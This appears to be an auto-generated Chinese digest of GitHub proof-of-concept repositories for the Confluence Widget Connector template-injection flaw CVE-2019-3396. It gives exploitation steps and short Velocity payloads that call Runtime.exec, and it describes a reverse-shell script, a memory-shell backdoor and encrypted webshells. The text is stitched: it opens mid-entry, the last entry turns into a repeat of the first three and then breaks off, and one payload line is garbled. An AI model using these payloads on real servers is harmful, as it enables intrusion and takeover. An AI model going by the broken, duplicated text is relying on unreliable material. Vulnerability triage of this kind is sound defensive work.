**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 目标Confluence服务器存在Widget Connector宏，且未进行身份验证即可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用服务器端模板注入漏洞执行任意代码。

**有效性：**
提供的POC代码看起来是有效的。漏洞库信息和搜索结果都表明该漏洞已经被广泛利用，并且有可用的POC代码。POC代码通过构造包含恶意Velocity模板的请求，发送到 Confluence 服务器的 `/rest/tinymce/1/macro/preview` 接口，从而触发模板注入。

**投毒风险：**
代码主要功能是利用Velocity模板注入执行命令。其中使用了一个FTP服务器来托管payload，这是一种常见的绕过防火墙或上传限制的方法。该ruby脚本代码的主要功能是利用该漏洞，未发现明显的恶意代码或后门，但是代码中存在远程下载payload的行为，如果payload被替换，则存在一定的风险, 评估投毒风险为10%。

**利用方式：**
1.  攻击者首先需要找到存在漏洞的Confluence服务器。
2.  攻击者需要搭建一个FTP服务器，用于托管恶意Velocity模板。
3.  攻击者构造一个包含恶意Velocity模板的HTTP POST请求，发送到Confluence服务器的`/rest/tinymce/1/macro/preview`接口。该请求利用了 Widget Connector 宏的模板注入漏洞。
4.  Confluence服务器解析恶意Velocity模板，执行攻击者指定的命令，从而实现远程代码执行。

**综上所述，该漏洞的利用有效性高，存在一定的投毒风险。攻击者可以利用该漏洞在Confluence服务器上执行任意代码。**

**项目地址:** [0xNinjaCyclone/cve-2019-3396](https://github.com/0xNinjaCyclone/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #2

**来源**: [CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md](../2019/CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md)

## CVE-2019-3396_Confluence Widget Connector Macro SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者实现路径遍历和远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前, 6.7.0 至 6.12.3 之前, 6.13.0 至 6.13.3 之前, 以及 6.14.0 至 6.14.2 之前

**利用条件:** 需要目标系统存在漏洞版本的Confluence服务器，如果是RCE，可能需要合法的用户session。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以利用此漏洞进行路径遍历和远程代码执行。漏洞利用方式有两种：

1. **路径遍历（文件读取）：** 攻击者可以利用`_template`参数，通过构造恶意的路径，读取服务器上的任意文件或目录。此方式无需认证。

2. **远程代码执行（RCE）：** 攻击者可以上传一个包含恶意Velocity模板的文件到服务器，然后利用该漏洞从本地文件系统加载该模板，从而执行任意代码。此方式需要一个有效的用户session。该POC代码首先尝试找到用户的个人空间，如果不存在则创建，然后上传包含payload的模板文件，最后利用漏洞执行命令。

**关于投毒风险：**虽然代码看起来是直接利用漏洞，但仍存在一定的投毒风险（约10%）。

*   **依赖性风险：** 该脚本依赖于外部库（例如 `requests`）。如果攻击者控制了这些库的源或使用了被污染的库，则可能引入恶意代码。
*   **Payload风险：** 上传的Velocity模板payload可能被修改以执行未经授权的操作，或者被用于在受害者系统上安装恶意软件。
*   **后门风险：** 虽然该POC的目的是利用漏洞，但如果代码被恶意修改，可以在上传的模板中包含后门，允许攻击者在漏洞修复后仍然可以访问系统。

因此，在使用该POC时，建议仔细审查代码，确保所使用的库是可信的，并对上传的payload进行严格的安全评估。此外，还应监控Confluence服务器的行为，以检测任何可疑活动。

**项目地址:** [46o60/CVE-2019-3396_Confluence](https://github.com/46o60/CVE-2019-3396_Confluence)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #3

**来源**: [CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md](../2019/CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入宏内容

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意宏内容，实现任意代码执行。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC是有效的。漏洞库信息明确指出该漏洞允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。搜索引擎结果中也提及了该漏洞被用于传播恶意软件，例如加密货币挖矿程序和Gandcrab勒索软件。提供的Java代码是一个典型的Java内存马，通过ServletRequestListener注入，劫持请求，从而实现RCE。

**投毒风险：**
该POC代码本身就是一个用于植入内存马的恶意代码。投毒风险的评估主要是判断作者是否在内存马本身之外，还加入了其他的恶意行为。在给定的代码片段中，我们可以看到有尝试写入错误信息到`/tmp/success-error-2`的逻辑，如果攻击者能够控制写入的文件路径，那么这将是一个潜在的投毒点。但是总体而言，这段代码的主要功能是内存马注入，额外的恶意行为并不明显。因此，初步判断投毒风险较低。如果代码仓库中有其他编译后的类或者配置文件，可能会包含更多的投毒行为，但是仅凭这段代码，投毒的可能性为10%。

**利用方式：**
1.  **利用入口：** 利用Confluence的Widget Connector宏插入恶意Velocity模板代码。
2.  **SSTI Payload：** 构造包含恶意代码的Velocity模板Payload。常见的Payload用于执行系统命令，例如：`{code}${#req = facotry.getObject().getClass().forName('javax.servlet.http.HttpServletRequest').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}`
3.  **内存马注入 (POC)：**
    *   该POC代码的目的是将一个恶意的ServletRequestListener注册到Confluence的Servlet容器中。
    *   它首先尝试找到Confluence应用使用的ClassLoader，这通常需要遍历线程，找到包含特定名称的线程（如`hz.confluence.scheduled.thread`）。
    *   然后，它利用反射获取StandardContext，这是Servlet容器的核心组件。
    *   接着，它创建一个实现了ServletRequestListener接口的动态代理，并将其实例注册到StandardContext中。
    *   当有新的HTTP请求到达时，代理的invoke方法会被调用，执行`backDoor`方法（在给定的代码片段中未完整给出）。`backDoor`方法很可能会从请求中提取命令并执行，从而实现远程代码执行。

总而言之，该漏洞利用方式是先通过SSTI漏洞注入恶意代码，然后通过植入内存马的方式维持控制。


**项目地址:** [Avento/CVE-2019-3396-Memshell-for-Behinder](https://github.com/Avento/CVE-2019-3396-Memshell-for-Behinder)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #4

**来源**: [CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md](../2019/CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md)

## CVE-2019-3396-Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server and Data Center

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，且服务器版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是一个影响Atlassian Confluence Server和Data Center的服务器端模板注入漏洞。该漏洞存在于Widget Connector宏中，允许未经身份验证的远程攻击者通过构造恶意的请求，执行任意代码。 

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、已被积极利用的漏洞，存在公开的PoC（Proof of Concept）代码。多个安全厂商（如Rapid7、Trend Micro等）都发布了关于该漏洞的分析和利用的报告。提供的PoC代码 `README.md` 文件表明该漏洞可以通过Velocity模板注入实现。虽然只提供了一个简单的 `README.md` 文件，但根据搜索结果，存在多个可用的PoC利用代码。

**投毒风险：**
提供的漏洞利用代码仅包含一个 `README.md` 文件，描述了漏洞名称。从现有文件本身来看，不存在明显的恶意代码。 但是，如果从其他源获取利用代码，则存在潜在的投毒风险。攻击者可能会在PoC中添加恶意功能，例如安装后门、窃取凭据或进行其他未经授权的活动。因此，在使用任何第三方提供的PoC代码之前，务必进行彻底的安全审查。 投毒风险估计为10%，主要是考虑到从不可信来源获取PoC的潜在风险。

**利用方式：**
漏洞的利用方式是通过在Confluence页面的Widget Connector宏中注入恶意的Velocity模板代码。当Confluence服务器渲染包含恶意代码的页面时，会执行该代码，从而允许攻击者执行任意命令。

1.  **找到存在Widget Connector宏的Confluence页面。**
2.  **构造包含恶意Velocity模板代码的请求。**
3.  **将请求发送到Confluence服务器。**
4.  **服务器执行恶意代码，实现远程代码执行。**

攻击者可以利用此漏洞执行任意系统命令，读取或修改敏感数据，或完全控制Confluence服务器。 搜索结果显示，该漏洞已被用于传播加密货币挖矿恶意软件和Gandcrab勒索软件。

**项目地址:** [HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection](https://github.com/HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #5

**来源**: [CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md](../2019/CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md)

## CVE-2019-3396-Atlassian Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Widget Connector宏开启且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 存在于 Atlassian Confluence Server 的 Widget Connector 宏中，由于服务端模板注入漏洞，攻击者可以通过构造恶意的 Velocity 模板代码，在 Confluence 服务器上执行任意命令。从提供的POC代码来看, `test.vm` 和 `test2.vm` 文件包含了利用 Velocity 模板引擎执行命令的代码。它们通过 `java.lang.Runtime` 类来执行系统命令，并读取命令执行结果。利用方式是，构造包含恶意Velocity代码的请求发送给Confluence服务器，服务器在渲染包含Widget Connector宏的页面时，会执行恶意代码，从而实现远程代码执行。根据搜索结果,该漏洞被广泛利用, 存在多种PoC和exp.

 **有效性:**  POC代码有效,因为它使用了Velocity模板语言来执行命令.通过getRuntime方法可以执行任意命令。

**投毒风险:** 仓库中主要包含用于漏洞验证和利用的Velocity模板代码，没有发现明显的恶意或后门代码，因此投毒风险较低。

**利用方式:**

1.  **定位漏洞点:** 确定目标Confluence服务器版本在受影响范围内，且启用了Widget Connector宏。
2.  **构造恶意请求:**  构建包含恶意Velocity模板代码的HTTP请求，该代码利用 `java.lang.Runtime` 执行系统命令。
3.  **发送请求:**  将构造好的请求发送给Confluence服务器。攻击者需要找到一个页面或接口，该页面或接口允许通过Widget Connector宏插入并渲染Velocity模板。
4.  **执行命令:** Confluence服务器解析并执行Velocity模板代码，从而在服务器上执行攻击者指定的命令。
5.  **获取结果:**  攻击者可以通过读取命令执行的输出来获取敏感信息，或者执行其他恶意操作。

**项目地址:** [JonathanZhou348/CVE-2019-3396TEST](https://github.com/JonathanZhou348/CVE-2019-3396TEST)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #6

**来源**: [CVE-2019-3396-PetrusViet_cve-2019-3396.md](../2019/CVE-2019-3396-PetrusViet_cve-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector 远程代码执行

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.12 之前的所有 6.6.x 版本；6.7.0 到 6.12.3 之前的所有 6.12.x 版本；6.13.0 到 6.13.3 之前的所有 6.13.x 版本；6.14.0 到 6.14.2 之前的所有 6.14.x 版本

**利用条件:** 需要目标Confluence实例存在Widget Connector宏且版本在受影响范围内，且允许用户编辑页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中，允许未经身份验证的远程攻击者通过服务器端模板注入执行任意代码。攻击者可以通过构造包含恶意 Velocity 模板代码的请求，利用 Widget Connector 宏中的漏洞执行操作系统命令。根据漏洞库信息和搜索结果，该漏洞已被广泛利用，存在多种PoC。提供的漏洞利用代码是一个用于调试和分析漏洞的开发环境搭建指南，没有直接提供可用于攻击的有效payload，但可以辅助理解漏洞原理和构建利用代码。

**有效性评估：** 漏洞有效性高，因为漏洞库信息和搜索结果均表明该漏洞已被公开披露并被广泛利用。

**投毒风险评估：** 代码仓库的主要目的是提供一个本地调试和分析漏洞的环境，而不是直接提供一个用于攻击的利用脚本。虽然不能完全排除作者在构建环境中隐藏恶意代码的可能性，但考虑到代码仓库的内容主要是配置和调试指南，直接投毒的可能性较低。因此，投毒风险估计为 10%。风险主要来自于用户在搭建调试环境的过程中可能引入的外部依赖或配置不当。

**利用方式分析：**

1.  **定位 Widget Connector 宏：** 在 Confluence 页面中插入一个 Widget Connector 宏。
2.  **构造恶意请求：**  构造包含恶意 Velocity 模板代码的请求，例如 `${Runtime.getRuntime().exec("command")}`，该代码会被服务器解析并执行。
3.  **发送请求：** 将构造好的请求发送到 Confluence 服务器。请求可能包含在 Widget Connector 宏的 URL 参数或其他相关字段中。
4.  **执行代码：** Confluence 服务器在处理包含恶意模板代码的 Widget Connector 宏时，会执行其中的代码，导致远程代码执行。

从搜索结果来看，攻击者利用该漏洞传播恶意软件（如加密货币矿工和勒索软件）的情况较为普遍。

**项目地址:** [PetrusViet/cve-2019-3396](https://github.com/PetrusViet/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #7

**来源**: [CVE-2019-3396-W2Ning_CVE-2019-3396.md](../2019/CVE-2019-3396-W2Ning_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Widget-Connector-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Server实例存在Widget Connector宏，且版本在受影响范围内。无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Atlassian Confluence Server的Widget Connector宏中，由于对用户输入过滤不严格，导致攻击者可以通过构造恶意的Velocity模板代码，实现服务器端模板注入(SSTI)，进而执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2019-3396是一个已知的且被广泛利用的漏洞。漏洞利用代码中提供了多个`.vm`文件，这些是Velocity模板文件，用于执行任意命令或获取服务器信息。`cmd.vm`和`cmd2.vm`用于执行命令，而`test.vm`用于获取系统属性。

根据提供的漏洞利用代码，`cmd.vm` 和 `cmd2.vm` 这两个文件利用 `java.lang.Runtime.getRuntime().exec()` 执行任意命令。`test.vm` 获取系统属性。这些代码与公开的漏洞利用信息相符，表明提供的POC代码有效。

**投毒风险分析：**

提供的漏洞利用代码主要包含Velocity模板文件(`.vm`)，以及一些jspx和aspx文件。Velocity模板文件用于服务器端模板注入，主要目的是执行命令或获取系统信息，本身不具备明显的投毒特征。
*   `cmd.vm` 和 `cmd2.vm`: 用于远程命令执行，直接利用了漏洞，不包含投毒代码。
*   `test.vm`: 用于获取系统属性，例如用户目录，操作系统等，不包含投毒代码。
*   `test.aspx` (C#): 通过Session传递密钥，然后使用RijndaelManaged算法进行解密，加载并执行，这段代码有作为webshell的潜力，但是它需要一个配合的加密后的payload才能生效，因此它的风险在于后续的payload。投毒风险较低。
*   `test.jspx`: 通过Session传递密钥，然后使用AES算法进行解密，加载并执行，这段代码有作为webshell的潜力，需要配合加密后的payload，因此它的风险在于后续的payload。投毒风险较低。

总体来看，投毒风险主要来源于`test.aspx`和`test.jspx` 潜在的后门风险，需要配合加密的payload才能触发。如果后续使用了被篡改的Payload可能会存在投毒行为,因此总体投毒风险评估为10%。

**利用方式：**

1.  **漏洞入口：**  利用Confluence Server中Widget Connector宏。
2.  **构造恶意Velocity模板：**  构造包含恶意代码的Velocity模板，例如利用`java.lang.Runtime.getRuntime().exec()`执行任意命令。
3.  **发送Payload：**  将构造好的恶意Velocity模板代码作为Widget Connector宏的参数发送给Confluence Server。
4.  **远程代码执行：**  Confluence Server解析Velocity模板时，执行其中的恶意代码，实现远程代码执行。

**项目地址:** [W2Ning/CVE-2019-3396](https://github.com/W2Ning/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #8

**来源**: [CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md](../2019/CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro SSTI RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入（SSTI）导致远程代码执行（RCE）

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致完全控制Confluence服务器

**影响版本:** 受影响版本包括：6.6.0-6.6.11, 6.7.0-6.12.2, 6.13.0-6.13.2, 6.14.0-6.14.1

**利用条件:** 需要能够向Confluence服务器发送HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而完全控制Confluence服务器。 

**有效性:** 提供的POC代码有效。参考Rapid7和Exploit-DB的链接，都有公开的利用代码。POC代码 `RCE_exp.py` 使用 `requests` 库发送恶意构造的POST请求到 `/rest/tinymce/1/macro/preview` 接口，通过修改 `_template` 参数，注入Velocity模板代码，从而执行任意命令。

**投毒风险:**  代码仓库中的 `RCE_exp.py` 和 `cmd.vm` 看起来是标准的漏洞利用代码。`cmd.vm` 文件是Velocity模板代码，负责执行命令。`RCE_exp.py` 负责构造和发送HTTP请求，以及从响应中提取结果。没有发现明显的恶意代码或者后门，投毒的可能性较低。

**利用方式:**

1.  **漏洞原理：** Widget Connector宏允许用户在Confluence页面中嵌入来自外部源的内容。由于对用户提供的URL参数过滤不足，攻击者可以通过构造恶意的URL，触发服务器端模板注入。
2.  **利用步骤：**
    a.  准备一个包含恶意Velocity模板代码的文件（`cmd.vm`）。该文件包含执行命令的代码。
    b.  将 `cmd.vm` 文件放置在一个可以通过FTP或者HTTPS协议访问的服务器上。
    c.  修改 `RCE_exp.py` 脚本中的 `filename` 变量，指向 `cmd.vm` 文件的URL。
    d.  运行 `RCE_exp.py` 脚本，指定Confluence服务器的URL和要执行的命令。
    e.  脚本会发送包含恶意URL的POST请求到Confluence服务器。
    f.  Confluence服务器解析恶意URL，执行Velocity模板代码，从而执行攻击者指定的命令。
3.  **影响：** 成功利用此漏洞可以导致远程代码执行，攻击者可以获取Confluence服务器的完全控制权限，从而窃取敏感数据、篡改页面内容或者进行其他恶意活动。

**结论:**
此漏洞的POC代码有效，且利用方式相对简单，可以通过公开的POC代码进行验证。虽然搜索结果显示存在投毒的情况，但提供的代码中未发现明显的投毒迹象。此漏洞危害严重，需要及时修复。

**项目地址:** [Yt1g3r/CVE-2019-3396_EXP](https://github.com/Yt1g3r/CVE-2019-3396_EXP)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #9

**来源**: [CVE-2019-3396-am6539_CVE-2019-3396.md](../2019/CVE-2019-3396-am6539_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本: 6.6.12之前 (6.6.x修复版本); 6.7.0 到 6.12.3之前 (6.12.x修复版本); 6.13.0 到 6.13.3之前 (6.13.x修复版本); 6.14.0 到 6.14.2之前 (6.14.x修复版本)

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且未打补丁，攻击者需要能够访问Confluence Server的网络。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而实现远程代码执行。根据提供的漏洞利用代码，利用方式如下：

1.  **漏洞利用代码分析：**
    *   `cmd.vm`：包含一个Velocity模板，该模板利用java.lang.Runtime类执行系统命令。变量`$cmd`需要预先设置，然后注入到Velocity模板中。
    *   `nc.py`：一个Python脚本，用于建立反向连接shell。该脚本尝试连接到攻击者指定的IP地址和端口，然后将标准输入、输出和错误重定向到socket，最后使用pty.spawn启动一个shell。
    *   `README.md`：仅包含漏洞ID，无实际利用功能。

2.  **利用方式：**
    攻击者首先需要确定目标Confluence Server存在该漏洞。然后，攻击者需要构造一个包含恶意Velocity模板的请求，将`cmd.vm`中的模板内容嵌入到Widget Connector宏中，并设置`$cmd`变量为需要执行的命令。如果需要反向连接，则`$cmd`变量设置为执行`nc.py`脚本。攻击者需要在自己的服务器上监听指定的端口。当Confluence Server解析该恶意请求时，会执行其中的Velocity模板代码，从而执行攻击者指定的系统命令或反向连接。

3.  **有效性：**
    根据漏洞库信息和搜索结果，该漏洞利用POC是有效的。搜索结果中存在多个分析和利用示例，以及利用该漏洞传播恶意软件的案例。提供的`cmd.vm`代码是典型的Velocity模板注入payload，可以执行任意命令。

4.  **投毒风险：**
    `nc.py`脚本尝试清除和禁用历史记录，这可能是为了隐藏攻击痕迹。此外，需要手动设定IP地址与端口，存在一定的部署成本，不太利于大规模传播。因此，该仓库的整体投毒风险较低，大约为10%。这种投毒风险主要来自于攻击者可以修改nc.py或者cmd.vm文件，嵌入后门代码，一旦成功执行，会直接暴露服务器，但是这种添加的成本较高,收益相对较低。

**项目地址:** [am6539/CVE-2019-3396](https://github.com/am6539/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #10

**来源**: [CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md](../2019/CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前 (6.6.x修复版本), 6.7.0 到 6.12.3 之前 (6.12.x修复版本), 6.13.0 到 6.13.3 之前 (6.13.x修复版本), 以及 6.14.0 到 6.14.2 之前 (6.14.x修复版本)

**利用条件:** 需要能够访问Confluence服务器并利用Widget Connector宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板语言执行任意代码。漏洞利用代码 `rce.vm` 使用了 Velocity 模板注入，通过反射获取 `java.lang.Runtime` 类，然后调用 `exec` 方法来执行命令。在这个例子中，执行的是 `calc.exe`，这是一个用于测试的payload，实际应用中可以替换为任意命令。根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。根据搜索结果，该漏洞已被积极利用，攻击者利用该漏洞传播恶意软件，例如 Gandcrab 勒索软件和加密货币挖矿恶意软件。提供的POC代码非常直接，只包含简单的RCE代码，不存在隐藏的投毒代码。利用方式是通过构造恶意请求，在Widget Connector宏中使用恶意的Velocity模板代码，从而实现远程代码执行。

**项目地址:** [dothanthitiendiettiende/CVE-2019-3396](https://github.com/dothanthitiendiettiende/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #11

**来源**: [CVE-2019-3396-jas502n_CVE-2019-3396.md](../2019/CVE-2019-3396-jas502n_CVE-2019-3396.md)

# CVE-2019-3396

> 📦 该CVE有 **22** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md](../2019/CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 目标Confluence服务器存在Widget Connector宏，且未进行身份验证即可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用服务器端模板注入漏洞执行任意代码。

**有效性：**
提供的POC代码看起来是有效的。漏洞库信息和搜索结果都表明该漏洞已经被广泛利用，并且有可用的POC代码。POC代码通过构造包含恶意Velocity模板的请求，发送到 Confluence 服务器的 `/rest/tinymce/1/macro/preview` 接口，从而触发模板注入。

**投毒风险：**
代码主要功能是利用Velocity模板注入执行命令。其中使用了一个FTP服务器来托管payload，这是一种常见的绕过防火墙或上传限制的方法。该ruby脚本代码的主要功能是利用该漏洞，未发现明显的恶意代码或后门，但是代码中存在远程下载payload的行为，如果payload被替换，则存在一定的风险, 评估投毒风险为10%。

**利用方式：**
1.  攻击者首先需要找到存在漏洞的Confluence服务器。
2.  攻击者需要搭建一个FTP服务器，用于托管恶意Velocity模板。
3.  攻击者构造一个包含恶意Velocity模板的HTTP POST请求，发送到Confluence服务器的`/rest/tinymce/1/macro/preview`接口。该请求利用了 Widget Connector 宏的模板注入漏洞。
4.  Confluence服务器解析恶意Velocity模板，执行攻击者指定的命令，从而实现远程代码执行。

**综上所述，该漏洞的利用有效性高，存在一定的投毒风险。攻击者可以利用该漏洞在Confluence服务器上执行任意代码。**

**项目地址:** [0xNinjaCyclone/cve-2019-3396](https://github.com/0xNinjaCyclone/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #2

**来源**: [CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md](../2019/CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md)

## CVE-2019-3396_Confluence Widget Connector Macro SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者实现路径遍历和远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前, 6.7.0 至 6.12.3 之前, 6.13.0 至 6.13.3 之前, 以及 6.14.0 至 6.14.2 之前

**利用条件:** 需要目标系统存在漏洞版本的Confluence服务器，如果是RCE，可能需要合法的用户session。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以利用此漏洞进行路径遍历和远程代码执行。漏洞利用方式有两种：

1. **路径遍历（文件读取）：** 攻击者可以利用`_template`参数，通过构造恶意的路径，读取服务器上的任意文件或目录。此方式无需认证。

2. **远程代码执行（RCE）：** 攻击者可以上传一个包含恶意Velocity模板的文件到服务器，然后利用该漏洞从本地文件系统加载该模板，从而执行任意代码。此方式需要一个有效的用户session。该POC代码首先尝试找到用户的个人空间，如果不存在则创建，然后上传包含payload的模板文件，最后利用漏洞执行命令。

**关于投毒风险：**虽然代码看起来是直接利用漏洞，但仍存在一定的投毒风险（约10%）。

*   **依赖性风险：** 该脚本依赖于外部库（例如 `requests`）。如果攻击者控制了这些库的源或使用了被污染的库，则可能引入恶意代码。
*   **Payload风险：** 上传的Velocity模板payload可能被修改以执行未经授权的操作，或者被用于在受害者系统上安装恶意软件。
*   **后门风险：** 虽然该POC的目的是利用漏洞，但如果代码被恶意修改，可以在上传的模板中包含后门，允许攻击者在漏洞修复后仍然可以访问系统。

因此，在使用该POC时，建议仔细审查代码，确保所使用的库是可信的，并对上传的payload进行严格的安全评估。此外，还应监控Confluence服务器的行为，以检测任何可疑活动。

**项目地址:** [46o60/CVE-2019-3396_Confluence](https://github.com/46o60/CVE-2019-3396_Confluence)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #3

**来源**: [CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md](../2019/CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

